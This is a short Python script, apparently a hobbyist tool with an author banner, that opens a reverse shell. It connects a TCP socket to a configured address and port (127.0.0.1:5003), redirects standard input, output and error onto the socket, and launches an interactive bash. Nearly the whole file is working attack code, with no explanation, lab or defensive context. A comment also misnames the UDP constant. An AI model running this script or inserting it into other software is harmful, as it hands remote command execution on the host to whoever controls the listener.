#!/usr/bin/env python3

from subprocess import run
import os 

# # # # # # # # # # # # # # # # # # # # # #
#                                         #
#   Author  :   Keyj33k                   #
#   Contact :   nomotikag33n@gmail.com    #
#   Twitter :   @keyjeek                  #
#   Github  :   @keyj33k                  #
#   Insta   :   @keyjeek                  #
#   Version :   1.0.1                     #
#                                         #
# # # # # # # # # # # # # # # # # # # # # # 

class shell:
        
    def __init__(self, target_address, target_port):
        self.target_address = target_address
        self.target_port = target_port
            
reverse_connection = shell("127.0.0.1", int(5003))
from os import dup2
import socket
os.system('clear')

# Change socket.SOCK_STREAM(TCP) to socket.SOCK_DRAM for UDP connection
socket_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
socket_sock.connect((reverse_connection.target_address, reverse_connection.target_port))
    
dup2(socket_sock.fileno(),0)
dup2(socket_sock.fileno(),1)
dup2(socket_sock.fileno(),2)
run(["/bin/bash","-i"]) 
